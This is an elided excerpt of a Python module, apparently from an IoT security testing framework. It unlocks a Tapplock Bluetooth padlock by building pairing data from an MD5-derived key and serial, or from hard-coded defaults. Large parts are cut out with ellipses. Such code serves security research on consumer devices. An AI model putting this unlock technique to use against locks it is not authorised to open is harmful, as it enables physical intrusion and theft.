...
class TappUnlock(Test):
    ...
    def execute(self):
        ...
        try:
            if self.args.addr:
                TLog.generic(f"Tapplock BLE Address specified ({self.args.addr})")
    ...
    def unlock(self, mac, name=None):
        ...
        try:
            TLog.trydo("Unlocking Tapplock ({mac})")
            # Get key1 and serial
            pairing_data = None
            if self.args.default is False:
                ...
                TLog.generic(
                    "(Calculated hash={md5_hash})(key1={key1})(serial={serial})"
                )
                pairing_data = self.PAIRPREXIX + key1 + serial
            else:
                TLog.generic(
                    "(default key1={self.DEFKEY})(default serial={self.DEFSERIAL})"
                )
